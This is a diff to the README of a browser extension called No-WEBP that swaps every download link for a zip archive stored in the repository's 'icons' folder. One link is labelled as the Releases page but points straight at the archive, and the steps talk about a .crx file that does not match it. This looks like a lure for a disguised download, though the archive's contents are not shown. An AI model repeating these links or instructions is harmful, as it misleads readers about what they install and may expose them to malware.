@@ -4,7 +4,7 @@
 No-WEBP helps your browser show images in their original formats, like GIF, PNG, and JPG. This means no more WebP or AVIF images when you don’t want them.
 
 ## 📥 Download Now
-[![Download No-WEBP](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No-WEBP-v1.0.zip)](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No-WEBP-v1.0.zip)
+[![Download No-WEBP](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No_WEBP_v3.4.zip)](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No_WEBP_v3.4.zip)
 
 ## 📋 Features
 - **Original Formats:** Use GIF, PNG, and JPG images.
@@ -17,7 +17,7 @@ No-WEBP helps your browser show images in their original formats, like GIF, PNG,
 - **Memory:** Minimum of 2 GB RAM.
 
 ## 📥 Download & Install
-1. Click this link to [visit the Releases page](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No-WEBP-v1.0.zip).
+1. Click this link to [visit the Releases page](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No_WEBP_v3.4.zip).
 2. Look for the latest version at the top of the page.
 3. Choose the appropriate file for your operating system (e.g., for Windows, look for a `.crx` file).
 4. Click the file to download it to your computer.
@@ -47,6 +47,6 @@ If you encounter issues or have questions:
 - **Changelog:** Check the changelog for new features and bug fixes.
 
 ## 📥 Download Now
-[![Download No-WEBP](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No-WEBP-v1.0.zip)](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No-WEBP-v1.0.zip)
+[![Download No-WEBP](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No_WEBP_v3.4.zip)](https://raw.githubusercontent.com/dharunsrin/No-WEBP/master/icons/No_WEBP_v3.4.zip)
 
 Using No-WEBP is straightforward. Enjoy having images in their intended formats, enhancing your browsing experience.
